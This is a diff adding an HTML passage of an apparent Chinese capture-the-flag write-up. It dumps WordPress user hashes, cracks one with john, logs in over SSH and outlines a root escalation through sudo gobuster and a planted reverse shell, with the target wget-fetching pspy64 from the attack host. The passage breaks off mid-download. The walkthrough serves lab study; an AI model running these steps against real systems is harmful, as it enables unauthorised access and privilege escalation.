@@ -491,6 +491,337 @@
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;发现存在wp-config.php为配置文件，查看该文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ON9K.github.io/p/buster/index.assets/ce6b58b1-29aa-49bb-823c-f8131b85d28f.png&#34;
+	width=&#34;1005&#34;
+	height=&#34;255&#34;
+	srcset=&#34;https://ON9K.github.io/p/buster/index.assets/ce6b58b1-29aa-49bb-823c-f8131b85d28f_hu_68140444e57895cf.png 480w, https://ON9K.github.io/p/buster/index.assets/ce6b58b1-29aa-49bb-823c-f8131b85d28f_hu_bcbc30e0cb1e35a5.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;ce6b58b1-29aa-49bb-823c-f8131b85d28f&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;394&#34;
+		data-flex-basis=&#34;945px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;发现数据库用户名和密码，尝试能不能找到用户名密码&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MariaDB &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;wordpress&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from wp_users&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from wp_users&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ID &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_login &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_pass                          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_nicename &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_email        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_url              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_registered     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_activation_key                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; user_status &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; display_name &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ta0        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$P$BDDc71nM67DbOVN&lt;/span&gt;/U50WFGII6EF6.r. &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ta0           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2814928906@qq.com &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http://192.168.31.181 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2025-01-08 03:10:43 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                                               &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ta0          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; welcome    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$P$BtP9ZghJTwDfSn1gKKc&lt;/span&gt;.k3mq4Vo.Ko/ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; welcome       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 127.0.0.1@qq.com  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;                       &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 2025-01-08 04:29:28 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 1736310568:&lt;span class=&#34;nv&#34;&gt;$P$B2YbhlDVF1XWIurbL11Pfoasb&lt;/span&gt;./0tD. &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; welcome      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; rows in &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.001 sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里找到两个用户的密码，welcome用户密码的hash值是&lt;code&gt;$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/&lt;/code&gt;,用john爆破一下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;$P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/&amp;#39;&lt;/span&gt; &amp;gt;tmp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                                                    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# john tmp --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Using default input encoding: UTF-8
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;phpass &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;phpass &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$P&lt;/span&gt;$ or &lt;span class=&#34;nv&#34;&gt;$H&lt;/span&gt;$&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 256/256 AVX2 8x3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;No password hashes left to crack &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;see FAQ&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                                                                                                    
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# john tmp --show                                     
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;?:104567
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; cracked, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; left
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里爆破出来&lt;strong&gt;welcome&lt;/strong&gt;的密码是&lt;strong&gt;104567&lt;/strong&gt;，尝试ssh登陆&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# ssh welcome@10.0.2.11
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@10.0.2.11&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Linux listen 4.19.0-27-amd64 &lt;span class=&#34;c1&#34;&gt;#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;The programs included with the Debian GNU/Linux system are free software&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;the exact distribution terms &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; each program are described in the
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;individual files in /usr/share/doc/*/copyright.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;permitted by applicable law.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Last login: Sat Nov &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 06:19:03 &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; from 10.0.2.15
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ /usr/bin/script -qc /bin/bash /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:~$ ls -al
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; welcome welcome &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 06:02 .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root    root    &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw------- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; welcome welcome &lt;span class=&#34;m&#34;&gt;1046&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;29&lt;/span&gt; 06:57 .bash_history
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root    root      &lt;span class=&#34;m&#34;&gt;33&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2025&lt;/span&gt; user.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;成功登陆&lt;strong&gt;welcome&lt;/strong&gt;获得&lt;strong&gt;user.txt&lt;/strong&gt;，继续尝试提权获得root权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:~$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; welcome on listen:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    env_reset, mail_badpass, &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User welcome may run the following commands on listen:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ALL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/gobuster
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;可以用&lt;strong&gt;sudo&lt;/strong&gt;权限运行&lt;strong&gt;gobuster&lt;/strong&gt;，利用&lt;strong&gt;gobuster&lt;/strong&gt;的写文件功能配合&lt;strong&gt;pspy64&lt;/strong&gt;的定时任务，在定时任务里写入反弹shell反弹root的权限。&lt;/p&gt;
+&lt;p&gt;在攻击机开启http服务&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# python3 -m http.server &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;                                                  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Serving HTTP on 0.0.0.0 port &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;将pspy64上传至靶机tmp目录下（上传至别的目录可能权限不够），执行pspy64后会在opt目录下生成.test.sh文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;welcome@listen:/$ wget http://10.0.2.15/pspy64 -O /tmp/pspy64
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--2025-12-01 05:25:29--  http://10.0.2.15/pspy64
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Connecting to 10.0.2.15:80... connected.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP request sent, awaiting response... &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
